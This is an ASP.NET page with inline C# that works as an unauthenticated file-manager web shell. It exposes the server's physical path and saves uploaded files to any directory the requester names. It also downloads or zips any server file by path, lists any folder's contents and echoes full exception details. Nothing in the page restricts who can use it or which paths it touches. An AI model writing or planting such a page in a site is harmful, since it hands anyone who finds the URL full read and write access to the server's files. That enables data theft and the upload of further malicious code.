<%@ Page Language="C#" AutoEventWireup="true" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>

<html>
<head runat="server">
    <title></title>
</head>
<body>
    <form id="theForm" runat="server" enctype="multipart/form-data">
        PhysicalApplicationPath :=> <%= Request.PhysicalApplicationPath %><br />
        <% for (int i = 0; i < _fileCount; i++)
           { %>
        File <%= i %> :=>
        <input type="file" name="df" />
        Save To :=>
        <input type="text" name="saveTo" size="64" value="<%= _saveTo!=null && _saveTo.Length>0 ? _saveTo[i] : null %>" /><br />
        <% } %>
        <input id="Submit1" name="btnSubmit" type="submit" value="傳送" />
        <br />
        Download File :=>
        <input name="dlFN" type="text" size="64" value="<%= Request["dlFN"] %>" />
        <asp:Button ID="btnDownload" runat="server" Text="Download" OnClick="btnDownload_Click" ClientIDMode="Static" />&nbsp;<input id="cbZip" name="cbZip" type="checkbox" value="zip" <%= Request["cbZip"]!=null ? "checked" : null %> />
        Zip<br />
        Show Folder Info :=>
        <input name="f_Info" type="text" size="64" value="<%= Request["f_Info"] %>" />
        <asp:Button ID="btnFolerInfo" runat="server" Text="Display" OnClick="btnFolerInfo_Click" /><br />
        <% if(!String.IsNullOrEmpty(Request["f_info"]) && Directory.Exists(Request["f_info"])) {
               foreach (var info in Directory.EnumerateDirectories(Request["f_info"]))
               { %>
        <%= info %><br />
        <%     }
               foreach (var info in Directory.EnumerateFiles(Request["f_info"]))
               { %>
        <%= info %><br />
        <%     }
        %>

        <% } %>
    </form>
</body>
</html>
<script runat="server">

    int _fileCount = 10;
    String _storedPath = "temp";
    String[] _saveTo;
    
    protected override void OnInit(EventArgs e)
    {
        base.OnInit(e);

        try
        {
            _saveTo = Request.Form.GetValues("saveTo");

            String storedPath = Path.Combine(Request.PhysicalApplicationPath, _storedPath);
            if (!Directory.Exists(storedPath))
            {
                Directory.CreateDirectory(storedPath);
            }
            if (Request.Files.Count > 0)
            {
                for (int i = 0; i < Request.Files.Count; i++)
                {
                    HttpPostedFile file = Request.Files[i];
                    if (file.ContentLength > 0)
                    {
                        if (String.IsNullOrEmpty(_saveTo[i]))
                        {
                            file.SaveAs(Path.Combine(storedPath, Path.GetFileName(file.FileName)));
                        }
                        else
                        {
                            if (!Directory.Exists(_saveTo[i]))
                            {
                                Directory.CreateDirectory(_saveTo[i]);
                            }
                            file.SaveAs(Path.Combine(_saveTo[i], Path.GetFileName(file.FileName)));
                        }
                    }
                }
            }
        }
        catch(Exception ex)
        {
            Response.Write(ex.ToString());
        }
    }

    protected void btnDownload_Click(object sender, EventArgs e)
    {
        String fileName = Request["dlFN"];
        try
        {
            if (!String.IsNullOrEmpty(fileName))
            {
                if (File.Exists(fileName))
                {
                    if (Request["cbZip"] != null)
                    {
                        downloadMultiple(fileName);
                    }
                    else
                    {
                        WriteFileAsDownload(Response, fileName, null, false);
                    }
                }
                else
                {
                    downloadMultiple(fileName);
                }
            }
        }
        catch (System.Threading.ThreadAbortException ex)
        {

        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }
    }
    
    void downloadMultiple(String fileName)
    {
        String[] items = Directory.GetFiles(Path.GetDirectoryName(fileName), Path.GetFileName(fileName));
        if (items != null && items.Length > 0)
        {
            String temp = Server.MapPath("~/temp");
            if(!Directory.Exists(temp))
            {
                Directory.CreateDirectory(temp);
            }
            String outFile = Path.Combine(temp, Guid.NewGuid().ToString() + ".zip");
            using (var zipOut = File.Create(outFile))
            {
                using (ZipArchive zip = new ZipArchive(zipOut, ZipArchiveMode.Create))
                {
                    foreach (var item in items)
                    {
                        ZipArchiveEntry entry = zip.CreateEntry(Path.GetFileName(item));
                        using (Stream outStream = entry.Open())
                        {
                            using (var inStream = File.Open(item, FileMode.Open))
                            {
                                inStream.CopyTo(outStream);
                            }
                        }
                    }
                }
            }

            WriteFileAsDownload(Response, outFile, DateTime.Today.ToString("yyyy-MM-dd") + ".zip", true);
        }
    }

    public void WriteFileAsDownload(HttpResponse Response, string fileName, String outputName, bool deleteAfterDownload, String contentType = "message/rfc822")
    {
        Response.Clear();
        Response.ClearContent();
        Response.ClearHeaders();
        Response.AddHeader("Cache-control", "max-age=1");
        //Response.ContentEncoding = System.Text.Encoding.ASCII;
        //Response.Cache.SetCacheability(HttpCacheability.NoCache);
        Response.ContentType = String.IsNullOrEmpty(contentType) ? "message/rfc822" : contentType;
        Response.AddHeader("Content-Disposition", String.Format("attachment;filename={0}", HttpUtility.UrlEncode(!String.IsNullOrEmpty(outputName) ? outputName : Path.GetFileName(fileName))));
        //Response.WriteFile(fileName);
        using (FileStream fs = new FileStream(fileName, FileMode.Open, FileAccess.Read))
        {
            fs.CopyTo(Response.OutputStream);
            fs.Close();
        }
        Response.Flush();
        if (deleteAfterDownload)
        {
            File.Delete(fileName);
        }
        Response.End();
    }

    protected void btnFolerInfo_Click(object sender, EventArgs e)
    {

    }
</script>
